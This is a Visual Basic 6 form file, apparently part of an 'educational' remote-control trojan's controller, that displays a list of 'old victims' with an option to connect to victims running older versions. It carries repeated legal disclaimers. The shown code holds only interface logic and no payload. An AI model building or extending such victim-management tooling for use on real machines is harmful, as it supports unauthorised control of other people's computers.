VERSION 5.00
Begin VB.Form Form3 
   Appearance      =   0  'Flat
   BackColor       =   &H00E0E0E0&
   Caption         =   "Old victims"
   ClientHeight    =   6075
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   9660
   Icon            =   "Form3.frx":0000
   LinkTopic       =   "Form3"
   ScaleHeight     =   6075
   ScaleWidth      =   9660
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame8 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Old victims"
      ForeColor       =   &H80000008&
      Height          =   6015
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   9615
      Begin VB.CheckBox Check4 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Connect to old victims"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   960
         TabIndex        =   4
         ToolTipText     =   "Connect to victims older than version 6"
         Top             =   4800
         Width           =   1935
      End
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         Height          =   495
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   3
         Top             =   5160
         Width           =   9375
      End
      Begin VB.ListBox List1 
         Appearance      =   0  'Flat
         Height          =   4515
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   9375
      End
      Begin VB.Label Label6 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   4800
         Width           =   855
      End
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Private Sub Form_Load()
    'get saved data
    'get info from registry
    Dim tempregvalue As String
    tempregvalue = GetSetting(Form1.Name, "form1", "check4")
    If (tempregvalue = "1") Then
        Check4.Value = 1
    Else
        Check4.Value = 0
    End If

End Sub

Private Sub Form_Unload(Cancel As Integer)
    Form1.saveall
End Sub

Private Sub List1_Click()
    Dim qsee As Long
    qsee = List1.ListIndex
    Text1.Text = List1.List(qsee)
    Form1.Text1.Text = List1.List(qsee)
End Sub

Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
 If Button = vbRightButton Then
        PopupMenu Form1.listbox1
   End If
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

